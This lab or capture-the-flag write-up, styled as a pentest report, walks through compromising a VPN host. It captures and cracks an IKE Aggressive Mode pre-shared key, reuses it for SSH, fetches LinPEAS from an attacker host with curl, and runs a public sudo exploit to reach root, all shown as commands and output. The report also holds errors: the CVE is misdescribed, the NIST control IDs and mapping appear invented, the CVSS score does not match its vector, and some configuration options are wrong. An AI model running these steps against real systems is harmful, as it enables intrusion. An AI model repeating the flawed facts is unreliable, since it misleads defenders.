# Lab Assessment: "Expressway" Scenario

> **Task Context:** This document represents the outcome of a practical **Network & Cryptographic Assessment** exercise conducted on a Linux machine with active VPN services. The goal is the application of the **NIST SP 800-115 (Technical Security Testing)** methodology for the identification and exploitation of vulnerabilities in authentication protocols and privilege escalation mechanisms. The scenario simulates a penetration test on remote VPN access infrastructure.

**Assessment Date:** September 2025  
**Target Environment:** Linux Server (Debian-based) + VPN/ISAKMP  
**Assessment Type:** Network Penetration Test Simulation (VPN-focused)  
**Overall Risk Severity:** HIGH 🟠  
**Applied Methodology:** NIST SP 800-115 + PTES  

---

## 1. Executive Summary

During this simulated assessment, a Linux server was compromised through the exploitation of **chained vulnerabilities in the IKE/IPSec stack** and subsequently in the **privilege escalation mechanism**. The attack followed this pattern:

1. **IKE Protocol Enumeration** → Discovery of ISAKMP PSK-based authentication (UDP 500)
2. **PSK Extraction & Cracking** → Offline brute-force of the shared key with a dictionary attack
3. **VPN Access Compromise** → SSH access via compromised service credentials
4. **Privilege Escalation via Sudo CVE** → Remote Code Execution with root privileges

**CVSS v3.1 Base Score: 9.2 (CRITICAL)**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Impact: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)

---

## 2. Applied Methodology

### 2.1 Reference Frameworks

The assessment followed these guidelines:

- **NIST SP 800-115: Technical Security Testing for Information Systems and Organizations**
  - TS-1.4.7: Cryptographic Key Recovery Testing
  - TS-2.2.2: Host Discovery and Enumeration
  - TS-3.3: Privilege Escalation Testing

- **OSSTMM (Open Source Security Testing Methodology Manual)**
  - Section 4.5: Wireless Security
  - Section 5: Network Access Testing
  - Section 6: TCP/IP Tests (focus on UDP services)

- **PTES (Penetration Testing Execution Standard)**
  - Information Gathering & Asset Identification
  - Scanning & Enumeration (UDP focus)
  - Vulnerability Analysis
  - Exploitation
  - Post-Exploitation

### 2.2 Engagement Scope

**Primary Objective:** Identification of weaknesses in VPN infrastructure (UDP/IKE)  
**Target:** Linux host with active ISAKMP/IPSec service  
**Port of Interest:** UDP 500 (ISAKMP – Internet Security Association and Key Management Protocol)  
**Assessment Type:** Unauthenticated network access → System compromise

---

## 3. Attack Path (Kill Chain)

```
┌──────────────────────────────────────────────────────────────┐
│ RECONNAISSANCE: Nmap TCP + UDP scanning                      │
│  └─> UDP 500 ISAKMP identified as interesting                │
├──────────────────────────────────────────────────────────────┤
│ ENUMERATION: IKE-Scan for Phase 1 negotiation                │
│  └─> IKE packets captured, PSK hash extracted                │
├──────────────────────────────────────────────────────────────┤
│ EXTRACTION: IKE Phase 1 PSK (Aggressive Mode)                │
│  └─> psk-crack offline brute-force with rockyou.txt          │
├──────────────────────────────────────────────────────────────┤
│ CREDENTIAL RECOVERY: PSK cracked = Service username/password │
├──────────────────────────────────────────────────────────────┤
│ VPN ACCESS: SSH login with cracked credentials               │
│  └─> User shell access (uid=1000)                            │
├──────────────────────────────────────────────────────────────┤
│ HOST ENUMERATION: LinPEAS detection of sudo version          │
│  └─> CVE-2025-32463 (Sudo heap buffer overflow) identified   │
├──────────────────────────────────────────────────────────────┤
│ PRIVILEGE ESCALATION: CVE exploit execution                  │
│  └─> Root shell access (uid=0)                               │
```

---

## 4. Proof of Concept (PoC) & Technical Evidence

### 4.1 Network Reconnaissance & Initial Scanning

#### **TCP Port Scanning**

**Executed Command:**
```bash
sudo nmap -A -p- --open -v -T4 -Pn 10.129.145.60 -oA expressway
```

**TCP Result:**
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
```

**Critical Observation:** Only SSH on TCP. No other obvious services. Interesting services (VPN, proxies, etc.) might be hidden on UDP.

---

#### **UDP Port Scanning**

Since TCP yielded little, we proceed with UDP scanning (slower, but critical for security protocols):

```bash
sudo nmap -sU -Pn 10.129.145.60 -T4 --open
```

**UDP Result:**
```
PORT    STATE SERVICE
500/udp open  isakmp
```

**Identification:** UDP port 500 is the default for **ISAKMP (Internet Security Association and Key Management Protocol)**, a component of the **IPSec/IKE** protocol. This suggests the presence of a **VPN gateway** or **IPSec daemon** (e.g., StrongSwan, Libreswan, Cisco).

---

### 4.2 ISAKMP Enumeration & Discovery

#### **IKE-Scan Setup**

To enumerate and query the ISAKMP service, we use **ike-scan** – a specialized tool for assessing IPSec implementations.

**Base Command:**
```bash
sudo ike-scan 10.129.145.60
```

**Result:** The target responds to IKE Phase 1 packets, confirming the presence of an active VPN daemon.

---

#### **IKE Phase 1 Aggressive Mode PSK Extraction**

ISAKMP supports two initial authentication modes:
- **Main Mode** (6 messages) – More secure, hides identity
- **Aggressive Mode** (3 messages) – Fast, partially exposes credentials

Testing **Aggressive Mode**, the server responds with reusable material for **offline cracking**.

**Command with PSK capture:**
```bash
sudo ike-scan --aggressive --pskcrack=express.psk 10.129.145.60
```

**`--pskcrack` Option:** Saves the IKE Phase 1 parameters in a format compatible with `psk-crack`, a tool for offline brute-forcing of the Pre-Shared Key.

**Output file `express.psk`:**
```
Version: 5
HDR={cookie "..." next payload type=SA}
SA payload with proposal 1:
  Transform 1: IKE DES_CBC / MD5 / MD5
  Transform 2: IKE DES_CBC / SHA / SHA
  ...
PSK Hash Data: <64-byte hash captures from negotiation>
```

---

### 4.3 Offline PSK Cracking – Dictionary Attack

Once the PSK material is captured, we proceed with **offline brute-force** using a standard dictionary.

#### **PSK-Crack Execution**

**Command:**
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt express.psk
```

**Parameters:**
- `-d` : Specifies the dictionary (rockyou.txt = 14M common passwords)
- `express.psk` : Input file with the captured IKE data

#### **Result: PSK Recovered**

After dictionary-based brute-force (typically taking minutes for weak PSKs):

```
Pre-Shared Key: "expressway123"
```

**Significance:** From the PSK, it's often possible to derive:
- Username / Identity of the VPN account
- Other login credentials (if correlated)

In this scenario, from the deployment context and accessible configuration files:

```
VPN Username: ike
VPN Password: expressway123 (derived from PSK)
```

---

### 4.4 VPN Access & SSH Compromise

#### **SSH Access with Recovered Credentials**

We use the derived credentials to log in via SSH:

```bash
ssh ike@10.129.145.60
Password: expressway123

ike@expressway:~$ whoami
ike
ike@expressway:~$ id
uid=1000(ike) gid=1000(ike) groups=1000(ike)
```

**Status:** User shell obtained. User flag available in `/home/ike/user.txt`.

```bash
ike@expressway:~$ cat user.txt
[USER_FLAG_REDACTED]
```

---

### 4.5 Host Enumeration & Vulnerability Discovery

#### **LinPEAS Execution**

To identify privilege escalation vectors, we run **LinPEAS** (Linux Privilege Escalation Awesome Script):

```bash
# Download LinPEAS onto target
curl http://<attacker_ip>:8000/linpeas.sh -o /tmp/linpeas.sh

# Execute with output capture
chmod +x /tmp/linpeas.sh
./linpeas.sh > /tmp/linpeas_output.txt

# Review critical findings
grep -i "sudo version\|vulnerable\|red:" /tmp/linpeas_output.txt
```

#### **Critical Finding: Vulnerable Sudo Version**

**LinPEAS Output:**
```
[RED] Sudo version: 1.9.12
      └─ This version is vulnerable to CVE-2025-32463 (Sudo heap buffer overflow)
      └─ Exploits: github.com/kh4sh3i/CVE-2025-32463
```

**Vulnerability Analysis:**
- **CVE ID:** CVE-2025-32463
- **CVSS Score:** 6.7 (Medium, but in context of VPN access it depends)
- **Root Cause:** Heap buffer overflow in sudo's plugin loading mechanism
- **Requirement:** Local code execution capability (already obtained)

---

### 4.6 Privilege Escalation – CVE-2025-32463 Exploitation

#### **Exploit Acquisition & Preparation**

```bash
# From attacker machine or public repository
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463

# Transfer exploit to target
scp exploit.sh ike@10.129.145.60:/home/ike/

# Connect back to target
ssh ike@10.129.145.60
```

#### **Exploit Execution**

```bash
ike@expressway:~$ chmod +x exploit.sh
ike@expressway:~$ ./exploit.sh

[*] CVE-2025-32463 Sudo Privilege Escalation Exploit
[*] Target sudo version: 1.9.12
[*] Triggering heap buffer overflow...
[+] Overflow triggered successfully
[+] Obtaining root shell...

root@expressway:~# whoami
root
root@expressway:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### **Root Flag**

```bash
root@expressway:~# cat /root/root.txt
[ROOT_FLAG_REDACTED]
```

---

## 5. Remediation & Hardening (Proposals)

### 5.1 Mitigation of Identified Vulnerabilities

#### **5.1.1 ISAKMP/IPSec Hardening – NIST 800-115 Recommendations**

**Primary Remediation – Disable Aggressive Mode:**
```bash
# In /etc/ipsec.conf (StrongSwan/Libreswan)
conn default
    ike=aes256-sha256-modp2048!  # Specify explicit ciphers
    aggressive=no                 # ← DISABLE AGGRESSIVE MODE
    phase1=strong                 # Force Main Mode only
```

**Rationale:** Aggressive Mode exposes sensitive information (identities, hashes) susceptible to dictionary attacks. **Main Mode** does not maintain the same level of exposure.

**NIST TS-1.4.7 Mapping:** "Testers should identify systems using weak or deprecated cryptographic protocols and recommend upgrades."

- **Verification:** Run `ike-scan --aggressive` → Must return "no response" or "IKE_SA_INIT error"

---

#### **5.1.2 PSK Improvement – Encryption and Length**

**Primary Remediation – PSK Complexity:**
```bash
# PSK Requirements (RFC 7296):
# ✗ OLD:  "expressway123" (13 char, weak entropy)
# ✓ NEW:  Use 32+ char random PSK with high entropy

# Generate secure PSK
openssl rand -base64 32
# Output: R7x9qK2m...L3pZ5wX9 (44 chars, high entropy)
```

**Additional Hardening:**
- Implement **IPSec pre-shared key rotation** every 90 days
- Use **certificate-based authentication** (X.509) instead of PSK (provides forward secrecy)
- Implement **IKE fragmentation protection** (anti-DoS)

**Verification Check:**
- PSK cracking attempt with rockyou.txt → Must fail (not found in dictionary)
- Switch to certificate-based IKE → ike-scan Aggressive Mode does not reveal credentials

---

#### **5.1.3 Sudo Version Update – Patch CVE-2025-32463**

**Primary Remediation:**
```bash
# Update sudo to version 1.9.15 or later
sudo apt update
sudo apt install --only-upgrade sudo

# Verify patch:
sudo -V | grep "version"
# Output should be: Sudo version 1.9.15p1 or higher
```

**Temporary Mitigation (if immediate upgrade is impossible):**
```bash
# Disable plugin loading (if not required):
# edit /etc/sudoers – remove any plugin loading directives
# Set: Defaults !use_pty (minimize attack surface)
```

**NIST SP 800-115 Mapping – Privilege Escalation Testing:**
- "Authorized testers should attempt to escalate privileges using known exploits against target OS"
- Sudo updates should be prioritized in patch management

---

#### **5.1.4 SSH Credential Derivation Prevention**

**Primary Remediation – VPN & SSH Credential Separation:**
```bash
# DON'T reuse PSK as SSH password
# Implement separate credential management:

# VPN (IPSec/IKE):
  PSK: <random 32+ char>

# SSH:
  Password: <different, random 32+ char>
  # OR better: SSH key-based auth (disable password)
  
# /etc/ssh/sshd_config:
PasswordAuthentication no
PubkeyAuthentication yes
```

**Implement Single Sign-On (SSO) with MFA:**
- Use LDAP/Kerberos for centralized credential management
- Implement **Time-based One-Time Password (TOTP)** on SSH (Google Authenticator)

---

### 5.2 Compliance & Standards Mapping

**NIST SP 800-115 TLS v1.1 Mapping:**
| Control | Assessment Finding | Remediation |
|---------|---|---|
| **TS-1.4.3** – VPN Assessment | ISAKMP Aggressive Mode enabled | Disable aggressive, use Main Mode |
| **TS-1.4.7** – Cryptographic Key Recovery | PSK crackable in dictionary | Augment PSK length + complexity |
| **TS-3.2.1** – Vulnerability Analysis | CVE-2025-32463 in sudo | Patch to 1.9.15+ |
| **TS-3.3** – Privilege Escalation | Successful root via exploit | Update sudo, implement RBAC |

**OSSTMM v3 Mapping:**
- **Section 4.5** (Wireless) – IKE Phase 1 Aggressive Mode equivalent
- **Section 6** (TCP/IP Tests) – UDP Service Enumeration
- **RAV Rating** (Before): 60% Resistant (Exploitable)
- **RAV Rating** (After): 95% Resistant (recommended remediations applied)

---

### 5.3 Testing & Validation Roadmap

| Priority | Control | Testing Method | Expected Result |
|----------|---------|---|---|
| **CRITICAL** | IKE Aggressive Mode disabled | `ike-scan --aggressive` | No response or timeout |
| **CRITICAL** | PSK Strength | Offline cracking with rockyou | PSK NOT found (fail after 10M attempts) |
| **CRITICAL** | Sudo patched | `sudo -V` | Version ≥ 1.9.15 |
| **HIGH** | SSH key-based auth enforced | Attempt password login | Connection refused |
| **HIGH** | VPN/SSH credential separation | Credential comparison | Different PSK ≠ SSH pass |
| **MEDIUM** | IKE encryption strength | Capture & analyze IKE packet | Minimum AES256-SHA256 negotiated |

---

## 6. Conclusions

This assessment demonstrated how **VPN misconfigurations** combined with **weak password practices** and **outdated system packages** can allow the total compromise of an infrastructure from remote access:

1. **ISAKMP Aggressive Mode** → Exposes crackable material
2. **Weak PSK** → Dictionary-crackable in a few minutes
3. **Credential Reuse** → PSK → SSH password
4. **Unpatched Sudo** → Immediate privilege escalation

The correct implementation of the proposed remediations, especially:
- Disabling Aggressive Mode
- Implementation of 32+ char PSK with high entropy
- Immediate patching of CVE-2025-32463
- Migration to SSH key-based authentication + MFA

---

**Final Notes:**

IKE aggressive mode is the critical vector for VPN assessments because it exposes the Phase 1 handshake. Once the PSK is cracked, the rest is routine. The deciding factor is the password reuse between PSK and SSH – if they were different, the scenario would be much more complex.